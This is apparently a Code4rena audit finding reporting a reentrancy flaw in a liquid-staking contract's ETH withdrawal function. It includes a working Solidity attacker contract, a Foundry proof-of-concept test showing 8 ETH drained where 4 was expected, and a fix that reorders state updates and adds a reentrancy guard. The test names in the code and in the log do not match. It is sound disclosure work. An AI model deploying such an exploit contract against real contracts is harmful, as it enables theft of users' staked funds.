# Original link
https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110
# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347


# Vulnerability details

## Impact

Reentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet

## Proof of Concept

the code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.

```solidity
    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.
    /// @dev A banned node runner cannot withdraw ETH for the KNOT. 
    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn
    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {
        require(_recipient != address(0), "Zero address");
        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key has already withdrawn or not a part of LSD network");

        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];
        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, "Not the node runner for the smart wallet ");
        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, "Node runner is banned from LSD network");
        require(associatedSmartWallet.balance >= 4 ether, "Insufficient balance");
        require(
            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Initials not registered"
        );

        // refund 4 ether from smart wallet to node runner's EOA
        IOwnableSmartWallet(associatedSmartWallet).rawExecute(
            _recipient,
            "",
            4 ether
        );

        // update the mapping
        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;

        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);
    }
```

note the section:

```solidity
// refund 4 ether from smart wallet to node runner's EOA
IOwnableSmartWallet(associatedSmartWallet).rawExecute(
	_recipient,
	"",
	4 ether
);

// update the mapping
bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;
```

if the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.

As shown in our running POC.

We need to add the import first: 

```solidity
import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol";
```

We can add the smart contract below:

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12

```solidity
interface IManager {
    function registerBLSPublicKeys(
        bytes[] calldata _blsPublicKeys,
        bytes[] calldata _blsSignatures,
        address _eoaRepresentative
    ) external payable;
    function withdrawETHForKnot(
        address _recipient, 
        bytes calldata _blsPublicKeyOfKnot
    ) external;
}

contract NonEOARepresentative {

    address manager;
    bool state;

    constructor(address _manager) payable {

        bytes[] memory publicKeys = new bytes[](2);
        publicKeys[0] = "publicKeys1";
        publicKeys[1] = "publicKeys2";

        bytes[] memory signature = new bytes[](2);
        signature[0] = "signature1";
        signature[1] = "signature2";

        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(
            publicKeys,
            signature,
            address(this)
        );

        manager = _manager;

    }

    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {
        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);
    }

    receive() external payable {
        if(!state) {
            state = true;
            this.withdraw("publicKeys1");
        }
    }

}
```

there is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.

We add the test case.

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35

```solidity
function testBypassIsContractCheck_POC() public {

	NonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));
	address wallet = manager.smartWalletOfNodeRunner(address(pass));
	address reprenstative = manager.smartWalletRepresentative(wallet);
	console.log("smart contract registered as a EOA representative");
	console.log(address(reprenstative) == address(pass));

	// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED
	MockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1", 1);

	// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER
	pass.withdraw("publicKeys1");
	console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");
	console.log(address(pass).balance);

}
```

we run the test:

```solidity
forge test -vv --match testWithdraw_Reentrancy_POC
```

and the result is

```solidity
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[PASS] testWithdraw_Reentrancy_POC() (gas: 578021)
Logs:
  smart contract registered as a EOA representative
  true
  balance after the withdraw, expected 4 ETH, but has 8 ETH
  8000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 14.85ms
```

the function call is 

pass.withdraw("publicKeys1"), which calls

```solidity
function withdraw(bytes calldata _blsPublicKeyOfKnot) external {
	IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);
}
```

which trigger:

```solidity
// refund 4 ether from smart wallet to node runner's EOA
IOwnableSmartWallet(associatedSmartWallet).rawExecute(
	_recipient,
	"",
	4 ether
);
```

which triggers reentrancy to withdraw the fund again before the public key is banned.

```solidity
receive() external payable {
	if(!state) {
		state = true;
		this.withdraw("publicKeys1");
	}
}
```


## Tools Used

Manual Review

## Recommended Mitigation Steps

We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.

```solidity

// update the mapping
bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;

// refund 4 ether from smart wallet to node runner's EOA
IOwnableSmartWallet(associatedSmartWallet).rawExecute(
	_recipient,
	"",
	4 ether
);
```